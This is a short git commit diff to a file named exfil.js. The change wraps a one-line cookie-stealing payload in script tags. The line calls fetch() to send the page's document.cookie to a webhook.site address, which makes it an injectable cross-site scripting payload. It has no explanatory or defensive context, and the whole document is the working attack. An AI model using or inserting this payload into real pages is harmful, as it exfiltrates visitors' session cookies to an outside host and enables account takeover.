2ddfd0296cfc8846f79666b648f6348d40cfb925
RobertoHoungbo <143407538+RobertoHoungbo@users.noreply.github.com>
2025-05-05 17:05:30 +0200

    Update exfil.js

--- exfil.js
+++ exfil.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/4821a7ad-0120-4e83-aae0-4328fe954b59'+document.cookie);
+<script>fetch('https://webhook.site/4821a7ad-0120-4e83-aae0-4328fe954b59'+document.cookie);</script>
